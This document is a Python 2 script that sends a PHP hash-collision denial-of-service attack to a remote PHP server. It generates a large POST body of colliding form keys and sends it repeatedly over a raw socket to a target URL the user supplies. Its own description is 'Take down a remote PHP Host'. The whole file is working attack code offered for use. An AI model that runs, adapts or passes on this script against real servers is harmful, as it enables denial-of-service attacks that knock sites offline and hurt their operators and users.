'''
This script was written by Christian Mehlmauer <FireFart@gmail.com>
Original PHP Payloadgenerator taken from https://github.com/koto/blog-kotowicz-net-examples/tree/master/hashcollision
'''

import socket
import sys
import math
import urllib
import string
import time
import urlparse
import argparse

def main():
    parser = argparse.ArgumentParser(description="Take down a remote PHP Host")
    parser.add_argument("-u", "--url", dest="url", help="Url to attack", required=True)
    parser.add_argument("-w", "--wait", dest="wait", action="store_true", default=False, help="wait for Response")
    parser.add_argument("-c", "--count", dest="count", type=int, default=1, help="How many requests")
    parser.add_argument("-v", "--verbose", dest="verbose", action="store_true", default=False, help="Verbose output")
    parser.add_argument("-f", "--file", dest="file", help="Save payload to file")
    parser.add_argument("-o", "--output", dest="output", help="Save Server response to file. This name is only a pattern. HTML Extension will be appended. Implies -w")

    options = parser.parse_args()

    url = urlparse.urlparse(options.url)

    host = url.hostname
    path = url.path
    port = url.port
    if not port:
        port = 80
    if not path:
        path = "/"
    print("Generating Payload...")
    payload = generatePayload()
    print("Payload generated")
    if options.file:
        f = open(options.file, 'w')
        f.write(payload)
        f.close()
        print("Payload saved to %s" % options.file)
    print("Host: %s" % host)
    print("Port: %s" % str(port))
    print("path: %s" % path)
    print
    print

    for i in range(options.count):
        print("sending Request #%s..." % str(i+1))
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        except socket.error, msg:
            sys.stderr.write("[ERROR] %s\n" % msg[1])
            sys.exit(1)
        try:
            sock.connect((host, port))
            sock.settimeout(None)
        except socket.error, msg:
            sys.stderr.write("[ERROR] %s\n" % msg[1])
            sys.exit(2)

        request = "POST %s HTTP/1.0\r\nHost: %s\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %s\r\n\r\n%s\r\n\r\n" % (path, host, str(len(payload)), payload)
        sock.send(request)
        if options.verbose:
            if len(request) > 300:
                print(request[:300]+"....")
            else:
                print(request)
            print
        if options.wait or options.output:
            start = time.clock()
            data = sock.recv(1024)
            string = ""
            while len(data):
                string = string + data
                data = sock.recv(1024)
            elapsed = (time.clock() - start)
            print ("Request %s finished" % str(i+1))
            print ("Request %s duration: %s" % (str(i+1), elapsed))
            #only print http header
            split = string.partition("\r\n\r\n")
            header = split[0]
            content = split[2]
            if options.verbose:
                print
                print(header)
                print
            if options.output:
                f = open(options.output+str(i)+".html", 'w')
                f.write("<!-- "+header+" -->\r\n"+content)
                f.close()
        sock.close()

def generatePayload():
    # Taken from:
    # https://github.com/koto/blog-kotowicz-net-examples/tree/master/hashcollision

    # Note: Default max POST Data Length in PHP is 8388608 bytes (8MB)
    
    # entries with collisions in PHP hashtable hash function 
    a = {'0':'Ez', '1':'FY', '2':'G8', '3':'H'+chr(23), '4':'D'+chr(122+33)}
    # how long should the payload be
    length = 7
    size = len(a)
    post = ""
    maxvaluefloat = math.pow(size,length)
    maxvalueint = int(math.floor(maxvaluefloat))
    for i in range (maxvalueint):
        inputstring = base_convert(i, size)
        result = inputstring.rjust(length, '0')
        for item in a:
            result = result.replace(item, a[item])
        post += '' + urllib.quote(result) + '=&'

    return post;

def base_convert(num, base):
    fullalphabet = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    alphabet = fullalphabet[:base]
    if (num == 0):
        return alphabet[0]
    arr = []
    base = len(alphabet)
    while num:
        rem = num % base
        num = num // base
        arr.append(alphabet[rem])
    arr.reverse()
    return ''.join(arr)

if __name__ == "__main__":
    main()

